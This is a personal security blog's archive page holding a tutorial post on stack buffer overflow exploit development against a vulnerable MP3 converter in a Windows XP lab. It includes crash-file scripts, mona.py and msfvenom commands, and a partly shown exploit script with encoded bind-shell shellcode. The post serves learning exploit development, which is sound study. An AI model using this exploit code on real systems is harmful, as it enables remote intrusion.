<!DOCTYPE html>
<!--[if IE 6]>
<html id="ie6" lang="en-US">
<![endif]--><!--[if IE 7]>
<html id="ie7" lang="en-US">
<![endif]--><!--[if IE 8]>
<html id="ie8" lang="en-US">
<![endif]--><!--[if !(IE 6) & !(IE 7) & !(IE 8)]><!--><html lang="en-US">
<!--<![endif]-->
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<title>
Uncategorized | Graeme Robinson&#039;s blog	</title>
<link rel="profile" href="https://gmpg.org/xfn/11">
<link rel="stylesheet" type="text/css" media="all" href="/blog/wp-content/themes/twentyelevenmod/style.css?ver=20240716">
<link rel="pingback" href="/blog/xmlrpc.php">
<!--[if lt IE 9]>
<script src="/blog/wp-content/themes/twentyeleven/js/html5.js?ver=3.7.0" type="text/javascript"></script>
<![endif]-->
<meta name="robots" content="max-image-preview:large">
<link rel="alternate" type="application/rss+xml" title="Graeme Robinson&#039;s blog &raquo; Feed" href="/blog/feed/">
<link rel="alternate" type="application/rss+xml" title="Graeme Robinson&#039;s blog &raquo; Comments Feed" href="/blog/comments/feed/">
<link rel="alternate" type="application/rss+xml" title="Graeme Robinson&#039;s blog &raquo; Uncategorized Category Feed" href="/blog/category/uncategorized/feed/">
<script type="text/javascript">
/* <![CDATA[ */
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"\/blog\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.6.2"}};
/*! This file is auto-generated */
!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"🏳️‍⚧️","🏳️​⚧️")?!1:!n(e,"🇺🇳","🇺​🇳")&&!n(e,"🏴󠁧󠁢󠁥󠁮󠁧󠁿","🏴​󠁧​󠁢​󠁥​󠁮​󠁧​󠁿");case"emoji":return!n(e,"🐦‍⬛","🐦​⬛")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
/* ]]> */
</script>
<style id="wp-emoji-styles-inline-css" type="text/css">img.wp-smiley, img.emoji {
		display: inline !important;
		border: none !important;
		box-shadow: none !important;
		height: 1em !important;
		width: 1em !important;
		margin: 0 0.07em !important;
		vertical-align: -0.1em !important;
		background: none !important;
		padding: 0 !important;
	}</style>
<link rel="stylesheet" id="wp-block-library-css" href="/blog/wp-includes/css/dist/block-library/style.min.css?ver=6.6.2" type="text/css" media="all">
<style id="wp-block-library-theme-inline-css" type="text/css">.wp-block-audio :where(figcaption){color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-audio :where(figcaption){color:#ffffffa6}.wp-block-audio{margin:0 0 1em}.wp-block-code{border:1px solid #ccc;border-radius:4px;font-family:Menlo,Consolas,monaco,monospace;padding:.8em 1em}.wp-block-embed :where(figcaption){color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-embed :where(figcaption){color:#ffffffa6}.wp-block-embed{margin:0 0 1em}.blocks-gallery-caption{color:#555;font-size:13px;text-align:center}.is-dark-theme .blocks-gallery-caption{color:#ffffffa6}:root :where(.wp-block-image figcaption){color:#555;font-size:13px;text-align:center}.is-dark-theme :root :where(.wp-block-image figcaption){color:#ffffffa6}.wp-block-image{margin:0 0 1em}.wp-block-pullquote{border-bottom:4px solid;border-top:4px solid;color:currentColor;margin-bottom:1.75em}.wp-block-pullquote cite,.wp-block-pullquote footer,.wp-block-pullquote__citation{color:currentColor;font-size:.8125em;font-style:normal;text-transform:uppercase}.wp-block-quote{border-left:.25em solid;margin:0 0 1.75em;padding-left:1em}.wp-block-quote cite,.wp-block-quote footer{color:currentColor;font-size:.8125em;font-style:normal;position:relative}.wp-block-quote.has-text-align-right{border-left:none;border-right:.25em solid;padding-left:0;padding-right:1em}.wp-block-quote.has-text-align-center{border:none;padding-left:0}.wp-block-quote.is-large,.wp-block-quote.is-style-large,.wp-block-quote.is-style-plain{border:none}.wp-block-search .wp-block-search__label{font-weight:700}.wp-block-search__button{border:1px solid #ccc;padding:.375em .625em}:where(.wp-block-group.has-background){padding:1.25em 2.375em}.wp-block-separator.has-css-opacity{opacity:.4}.wp-block-separator{border:none;border-bottom:2px solid;margin-left:auto;margin-right:auto}.wp-block-separator.has-alpha-channel-opacity{opacity:1}.wp-block-separator:not(.is-style-wide):not(.is-style-dots){width:100px}.wp-block-separator.has-background:not(.is-style-dots){border-bottom:none;height:1px}.wp-block-separator.has-background:not(.is-style-wide):not(.is-style-dots){height:2px}.wp-block-table{margin:0 0 1em}.wp-block-table td,.wp-block-table th{word-break:normal}.wp-block-table :where(figcaption){color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-table :where(figcaption){color:#ffffffa6}.wp-block-video :where(figcaption){color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-video :where(figcaption){color:#ffffffa6}.wp-block-video{margin:0 0 1em}:root :where(.wp-block-template-part.has-background){margin-bottom:0;margin-top:0;padding:1.25em 2.375em}</style>
<style id="classic-theme-styles-inline-css" type="text/css">/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}</style>
<style id="global-styles-inline-css" type="text/css">:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #fff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--color--blue: #1982d1;--wp--preset--color--dark-gray: #373737;--wp--preset--color--medium-gray: #666;--wp--preset--color--light-gray: #e2e2e2;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}</style>
<link rel="stylesheet" id="wp-syntax-css-css" href="/blog/wp-content/plugins/wp-syntax/css/wp-syntax.css?ver=1.2" type="text/css" media="all">
<link rel="stylesheet" id="twentyeleven-block-style-css" href="/blog/wp-content/themes/twentyeleven/blocks.css?ver=20240621" type="text/css" media="all">
<script type="text/javascript" src="/blog/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
<script type="text/javascript" src="/blog/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
<link rel="https://api.w.org/" href="/blog/wp-json/">
<link rel="alternate" title="JSON" type="application/json" href="/blog/wp-json/wp/v2/categories/1">
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="/blog/xmlrpc.php?rsd">
<meta name="generator" content="WordPress 6.6.2">
	<style>/* Link color */
		a,
		#site-title a:focus,
		#site-title a:hover,
		#site-title a:active,
		.entry-title a:hover,
		.entry-title a:focus,
		.entry-title a:active,
		.widget_twentyeleven_ephemera .comments-link a:hover,
		section.recent-posts .other-recent-posts a[rel="bookmark"]:hover,
		section.recent-posts .other-recent-posts .comments-link a:hover,
		.format-image footer.entry-meta a:hover,
		#site-generator a:hover {
			color: #ff7600;
		}
		section.recent-posts .other-recent-posts .comments-link a:hover {
			border-color: #ff7600;
		}
		article.feature-image.small .entry-summary p a:hover,
		.entry-header .comments-link a:hover,
		.entry-header .comments-link a:focus,
		.entry-header .comments-link a:active,
		.feature-slider a.active {
			background-color: #ff7600;
		}</style>
	<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
<style type="text/css" id="custom-background-css">body.custom-background { background-color: #f1f1f1; }</style>
	</head>

<body class="archive category category-uncategorized category-1 custom-background wp-embed-responsive single-author two-column right-sidebar">
<div class="skip-link"><a class="assistive-text" href="#content">Skip to primary content</a></div>
<div class="skip-link"><a class="assistive-text" href="#secondary">Skip to secondary content</a></div>
<div id="page" class="hfeed">
	<header id="branding">
			<hgroup>
				<h1 id="site-title"><span><a href="/blog/" rel="home">Graeme Robinson&#039;s blog</a></span></h1>
				<h2 id="site-description">A place for my thoughts when I was starting to break into the information security feild</h2>
			</hgroup>

						<a href="/blog/">
				<img src="/blog/wp-content/uploads/2012/09/copy-Bruv-Beans-Banner.jpg" width="1000" height="228" alt="Graeme Robinson&#039;s blog" srcset="/blog/wp-content/uploads/2012/09/copy-Bruv-Beans-Banner.jpg 1000w, /blog/wp-content/uploads/2012/09/copy-Bruv-Beans-Banner-300x68.jpg 300w, /blog/wp-content/uploads/2012/09/copy-Bruv-Beans-Banner-500x114.jpg 500w" sizes="(max-width: 1000px) 100vw, 1000px" decoding="async" fetchpriority="high">			</a>
			
											
			<nav id="access">
				<h3 class="assistive-text">Main menu</h3>
				<div class="menu"><ul>
<li><a href="/blog/">Home</a></li>
<li class="page_item page-item-2"><a href="/blog/about-me/">About Me</a></li>
<li class="page_item page-item-13"><a href="/blog/infosec-links/">InfoSec Links</a></li>
</ul></div>
			</nav><!-- #access -->
	</header><!-- #branding -->


	<div id="main">

		<section id="primary">
			<div id="content" role="main">

			
				<header class="page-header">
					<h1 class="page-title">
					Category Archives: <span>Uncategorized</span>					</h1>

									</header>

				
				
					
	<article id="post-342" class="post-342 post type-post status-publish format-standard hentry category-buffer-overflow category-immunity category-mona-py category-uncategorized">
		<header class="entry-header">
						<h1 class="entry-title"><a href="/blog/learning-more-about-buffer-overflow-exploits/" rel="bookmark">Learning more about buffer overflow exploits</a></h1>
			
						<div class="entry-meta">
				<span class="sep">Posted on </span><a href="/blog/learning-more-about-buffer-overflow-exploits/" title="9:48 PM" rel="bookmark"><time class="entry-date" datetime="2018-07-20T21:48:34+00:00">2018-07-20</time></a><span class="by-author"> <span class="sep"> by </span> <span class="author vcard"><a class="url fn n" href="/blog/author/admin/" title="View all posts by Graeme Robinson" rel="author">Graeme Robinson</a></span></span>			</div>
<!-- .entry-meta -->
			
					</header><!-- .entry-header -->

				<div class="entry-content">
			<h1>Preamble</h1>
<p>After passing OSCP, I took a bit of a break from studying, but I&#8217;ve decided to get back on it and start learning more about exploit development, since that was part of the OSCP course that I found very interesting.</p>
<p>I had heard about the <a href="https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/">series of tutorials on the corelan blog</a> so I started to work through the first one and in doing so I hit a few problems and learned a few interesting things that I thought might be useful to others.</p>
<p>After mentioning to a colleague that I was learning about exploit development, they mentioned that <a href="https://www.fuzzysecurity.com/tutorials/expDev/1.html">fuzzysecurity has some good exploit development tutorials</a> too, so I will check those out in parallel.</p>
<p>Anyway, let&#8217;s get on with my experiences while following corelan&#8217;s &#8220;<a href="https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/">Exploit writing tutorial part 1</a>&#8220;:</p>
<h1>Setting up the environment</h1>
<p>The first thing I had to do was get a Windows XP VM up and running, install the vulnerable version of &#8220;Easy RM to MP3 Converter&#8221; and create an m3u file that would cause the application to crash. I&#8217;ll explain how I got a copy of Windows XP running in a VM for free (I could probably get this through my MSDN subscription, but that&#8217;s not necessary) and how I downloaded the app and created the m3u exploit file (hint: I didn&#8217;t use the perl script in corelan&#8217;s article).</p>
<h2>Windows XP VM</h2>
<p>Microsoft offers <a href="https://www.microsoft.com/en-gb/download/details.aspx?id=8002">a Windows XP VM as a free download</a>. It is intended to be run in Windows 7, providing a way of running programs that run on XP, but won&#8217;t on Windows 7, for example 16 bit executables. This &#8220;feature&#8221; is called &#8220;XP Mode&#8221;.</p>
<p>The download is an executable. If we inspect the exe file (using something like 7zip, don&#8217;t execute it!), we can extract the file &#8220;sources/xpm&#8221;, then rename it to xpm.cab and extract the &#8220;VirtualXPVHD&#8221; file from it. Rename this file to &#8220;VirtualXP.VHD&#8221; and then create a new VM in virtual box and use this file as the hard disk. It may be worth taking a snapshot before you start the VM because it will not be licensed and will stop working after 30 days. If you take a snapshot, you can revert it and get 30 days use out of it again.</p>
<h2>Easy RM to MP3 Converter</h2>
<p>I downloaded this from <a href="https://www.exploit-db.com/apps/707414955696c57b71c7f160c720bed5-EasyRMtoMP3Converter.exe">here on exploit-db</a>. The link comes from <a href="https://www.exploit-db.com/exploits/9186/">this exploit page</a>.</p>
<h2>Creating m3u that causes crash</h2>
<p>I use both python and perl at work, but I have more experience in python and I prefer it, so I installed python (I installed version 2.7.15 because it&#8217;s the latest v2.x and it supports Windows XP, where the latest v3.x doesn&#8217;t support Windows XP) and ported the code from perl to python. This is what I used to create the first m3u file from the article:</p>
<pre style="padding-left: 30px;">#!/usr/bin/env python


with open("crash.m3u", "w") as file:
    file.write("A" * 10000)


print "m3u File Created successfully"</pre>
<p>It doesn&#8217;t cause the crash, but if the number of &#8220;A&#8221;s is changed to 30000 then it will.</p>
<h1>Debugging</h1>
<p>I decided to use Immunity debugger because I think it has a nicer interface and can do more than Windbg. I also added mona.py (also from corelan) and used some of it&#8217;s features to make the process easier. The manual for mona.py which includes instructions to download and install it <a href="https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/">can be found here</a>.</p>
<h1>Finding the offset to overwrite EIP</h1>
<p>This section details finding the exact place in the m3u file that we need to put the bytes that we want to end up in EIP. It starts off by splitting the 30000 bytes into two chunks; the first one is 25000 and the second one is 5000. Then after determining that the bytes from the second (smaller) chunk are placed in EIP, a more accurate method is used to find the exact bytes.<strong> I tried to skip this step, which gave me incorrect results and it took me quite some time to figure out why. </strong>I&#8217;ll explain what tripped me up:</p>
<p>The article explains how to use a tool from the Metasploit framework to generate a pattern where the exact offset of a string of bytes can be identified. Incidentally, this syntax for this tool has changed, and it has moved in Kali (the successor to Backtrack, which it looks like is being used in this article). In Kali, it can be found at /usr/share/metasploit-framework/tools/exploit/pattern_create.rb but there is a symlink to it at /usr/bin/msf-pattern_create, so it can be run by just typing &#8220;msf-pattern_create&#8221;. I decided that since I have mona.py installed, I would just use that tool since it meant I didn&#8217;t need to start my Kali VM. I used mona.py to create a 30000 byte pattern using the command &#8220;!mona pc 30000&#8221; in Immunity debugger. A pattern is output to the log, but it&#8217;s truncated, so it can be copied from &#8220;C:\Program Files\Immunity Inc\Immunity Debugger\pattern.txt&#8221;.</p>
<p>I stuck this pattern in my python file and created a new m3u like this:</p>
<pre>#!/usr/bin/env python


PATTERN = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1...Ml1Ml2Ml3Ml4Ml5Ml6Ml7Ml8Ml9"


with open("crash.m3u", "w") as file:
file.write(PATTERN) 


print "m3u File Created successfully"</pre>
<p>and when I opened that file with Immunity attached, I saw the bytes &#8220;48386B48&#8221; in EIP. I used mona.py to locate those bytes (using the command &#8220;!mona po 48386B48&#8221;) in the pattern and it said they were at offset 5784. When I changed the bytes at that position in the m3u file, it didn&#8217;t make a difference to EIP shown in Immunity when I reloaded the file. I eventually discovered that the pattern created by Metasploit and mona is only 20,280 (26*26*10*3) bytes long and after that it starts again. The byte pattern in EIP was indeed the same as at offset 5784, but it was also at offset 26064 (5784 + 20280) and those are the bytes that made it into EIP! I should have just followed the steps, but I did end up learning the limitations of that pattern generator and offset locator.</p>
<h1>\xCC AKA INT3 aka &#8220;break&#8221;</h1>
<p>The article skips over what this mysterious \xCC byte does. A quick google search led me to <a href="https://en.wikipedia.org/wiki/INT_(x86_instruction)#INT_3">an article on wikipedia</a> that explained that it&#8217;s special single byte interrupt instruction for use by debuggers, so when the program hits this instruction, Immunity will pause execution so we can inspect the state of the registers and memory. Very useful!</p>
<h1>Finding a JMP ESP instruction</h1>
<p>The article covers how to find a JMP ESP instruction using Windbg, but not Immunity. I turned to mona.py again and used the command:</p>
<pre>!mona f -type instr -s "jmp esp" -o -cp nonull</pre>
<p>&#8230;which showed me some location in the log, but also wrote them to &#8220;C:\Program Files\Immunity Inc\Immunity Debugger\find.txt&#8221;</p>
<h2>Creating my own Shellcode using Metasploit</h2>
<p>I tried creating my own shellcode to spawn calc using &#8220;msfvenom -p windows/exec -f python&#8221;, but it didn&#8217;t work. Looking in the debugger, I could see that my Shellcode was being truncated. This was because my shellcode contained at least one null byte (\x00), but that wasn&#8217;t the only byte that caused the shellcode to become truncated, as I found out when I removed the null bytes. The article didn&#8217;t make it clear, but I would have to specify which bytes to exclude from the shellcode. Of course, I could use the the alpha_upper encoder which is shown later in the article, but I wanted to have a small shellcode. To find the bad bytes, I wanted to create a sequence of bytes 00 to FF and put them in the m3u file. I created the sequence of bytes again using mona.py. The command was &#8220;!mona ba&#8221; and mona would output to the log, but also to &#8220;C:\Program Files\Immunity Inc\Immunity Debugger\bytearray.txt&#8221; and I could stick that in my python script so that it would be written in the m3u file. Every time I saw a byte cause truncation or get swapped with another byte, I would add that to the list of bad chars for msfvenom to avoid. I ended up actually only finding two bad bytes; \x00 \x0A. To generate my own shellcode that spawned calc, I ran this command:</p>
<pre>msfvenom -p windows/exec -f python -b "\x00\x0a" CMD=calc</pre>
<h1>Completed python script to create bind shell exploit</h1>
<pre>#!/usr/bin/env python

# msfvenom -p windows/shell_bind_tcp -e x86/alpha_upper -f python EXITFUNC=seh
buf = ""
buf += "\x89\xe3\xda\xdc\xd9\x73\xf4\x5e\x56\x59\x49\x49\x49"
buf += "\x49\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33"
buf += "\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41"
buf += "\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41"
buf += "\x42\x32\x42\x42\x30\x42\x42\x58\x50\x38\x41\x43\x4a"
buf += "\x4a\x49\x4b\x4c\x4d\x38\x4b\x32\x55\x50\x35\x50\x35"
buf += "\x50\x55\x30\x4b\x39\x4b\x55\x36\x51\x39\x50\x52\x44"
buf += "\x4c\x4b\x36\x30\x46\x50\x4c\x4b\x46\x32\x44\x4c\x4c"
buf += "\x4b\x50\x52\x32\x34\x4c\x4b\x33\x42\x57\x58\x34\x4f"
buf += "\x4e\x57\x50\x4a\x56\x46\x50\x31\x4b\x4f\x4e\x4c\x57"
buf += "\x4c\x35\x31\x33\x4c\x35\x52\x56\x4c\x47\x50\x4f\x31"
buf += "\x58\x4f\x54\x4d\x55\x51\x58\x47\x5a\x42\x4c\x32\x31"
buf += "\x42\x51\x47\x4c\x4b\x36\x32\x52\x30\x4c\x4b\x31\x5a"
buf += "\x57\x4c\x4c\x4b\x50\x4c\x52\x31\x53\x48\x4a\x43\x37"
buf += "\x38\x53\x31\x48\x51\x46\x31\x4c\x4b\x36\x39\x31\x30"
buf += "\x33\x31\x58\x53\x4c\x4b\x57\x39\x52\x38\x4b\x53\x37"
buf += "\x4a\x47\x39\x4c\x4b\x47\x44\x4c\x4b\x33\x31\x49\x46"
buf += "\x56\x51\x4b\x4f\x4e\x4c\x39\x51\x38\x4f\x54\x4d\x43"
buf += "\x31\x48\x47\x47\x48\x4d\x30\x52\x55\x4b\x46\x33\x33"
buf += "\x43\x4d\x5a\x58\x57\x4b\x53\x4d\x47\x54\x34\x35\x5a"
